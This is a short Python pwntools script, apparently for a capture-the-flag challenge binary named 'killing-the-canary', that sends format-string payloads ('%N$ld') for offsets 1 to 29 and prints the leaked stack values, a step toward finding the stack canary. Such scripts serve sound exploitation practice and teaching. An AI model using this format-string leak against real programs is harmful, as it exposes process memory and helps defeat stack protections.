#!/usr/bin/env python3
import re
from pwn import *


for i in range(1,30):
    p = process('./killing-the-canary')
    payload = f"%{i}$ld"
    p.recvuntil(b"What's your name? ")
    p.sendline(payload.encode())
    result = p.recvline().strip().decode()

    print(f"Offset {i}: {result}")
    continue
